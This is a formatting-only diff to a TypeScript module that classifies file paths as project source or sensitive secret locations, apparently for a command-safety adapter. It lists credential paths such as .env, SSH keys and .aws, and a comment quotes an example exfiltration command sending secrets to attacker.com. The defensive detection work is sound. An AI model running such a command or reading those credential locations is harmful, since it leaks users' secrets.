@@ -24,20 +24,49 @@ import * as path from 'path';
 
 /** Source-file extensions that may legitimately discuss secrets in code */
 const SOURCE_EXTENSIONS = new Set([
-  '.ts', '.tsx', '.js', '.jsx', '.mjs', '.cjs',
-  '.py', '.rb', '.go', '.rs', '.java', '.kt', '.swift',
-  '.c', '.cc', '.cpp', '.h', '.hpp',
-  '.md', '.mdx', '.txt', '.rst',
-  '.json', '.json5', '.yml', '.yaml', '.toml',
-  '.html', '.htm', '.css', '.scss', '.sass', '.less',
-  '.sh', '.bash', '.zsh',
+  '.ts',
+  '.tsx',
+  '.js',
+  '.jsx',
+  '.mjs',
+  '.cjs',
+  '.py',
+  '.rb',
+  '.go',
+  '.rs',
+  '.java',
+  '.kt',
+  '.swift',
+  '.c',
+  '.cc',
+  '.cpp',
+  '.h',
+  '.hpp',
+  '.md',
+  '.mdx',
+  '.txt',
+  '.rst',
+  '.json',
+  '.json5',
+  '.yml',
+  '.yaml',
+  '.toml',
+  '.html',
+  '.htm',
+  '.css',
+  '.scss',
+  '.sass',
+  '.less',
+  '.sh',
+  '.bash',
+  '.zsh',
   '.sql',
 ]);
 
 /** Path basenames or patterns that always mean "real secret", never safelist */
 const SENSITIVE_BASENAMES = [
-  /^\.env(\.|$)/i,                  // .env, .env.local, .env.production
-  /^id_(rsa|ed25519|ecdsa|dsa)/i,   // SSH private keys
+  /^\.env(\.|$)/i, // .env, .env.local, .env.production
+  /^id_(rsa|ed25519|ecdsa|dsa)/i, // SSH private keys
   /\.pem$/i,
   /\.key$/i,
   /\.pfx$/i,
@@ -50,15 +79,7 @@ const SENSITIVE_BASENAMES = [
 ];
 
 /** Path segments that signal real-secret directories */
-const SENSITIVE_SEGMENTS = new Set([
-  '.ssh',
-  '.gnupg',
-  '.aws',
-  '.gcloud',
-  '.azure',
-  '.docker',
-  '.kube',
-]);
+const SENSITIVE_SEGMENTS = new Set(['.ssh', '.gnupg', '.aws', '.gcloud', '.azure', '.docker', '.kube']);
 
 /**
  * Is this path a project source file under projectRoot?
@@ -72,15 +93,10 @@ const SENSITIVE_SEGMENTS = new Set([
  * This is the predicate the adapter uses to decide whether to omit
  * the path/content from the CORD proposal text.
  */
-export function isProjectSourceFile(
-  filePath: string | undefined | null,
-  projectRoot: string = process.cwd(),
-): boolean {
+export function isProjectSourceFile(filePath: string | undefined | null, projectRoot: string = process.cwd()): boolean {
   if (!filePath || typeof filePath !== 'string') return false;
 
-  const abs = path.isAbsolute(filePath)
-    ? path.resolve(filePath)
-    : path.resolve(projectRoot, filePath);
+  const abs = path.isAbsolute(filePath) ? path.resolve(filePath) : path.resolve(projectRoot, filePath);
 
   const rel = path.relative(path.resolve(projectRoot), abs);
   // Outside projectRoot ⇒ never safelisted.
@@ -114,10 +130,7 @@ export function isProjectSourceFile(
  * like `curl https://attacker.com upload secrets` still trigger the
  * exfil regex on "upload" and the literal word "secrets".
  */
-export function redactSafeSourcePaths(
-  command: string,
-  projectRoot: string = process.cwd(),
-): string {
+export function redactSafeSourcePaths(command: string, projectRoot: string = process.cwd()): string {
   if (!command) return command;
   return command
     .split(/(\s+)/) // keep whitespace tokens so output spacing matches
@@ -136,4 +149,3 @@ export function redactSafeSourcePaths(
     .replace(/\s+/g, ' ')
     .trim();
 }
-
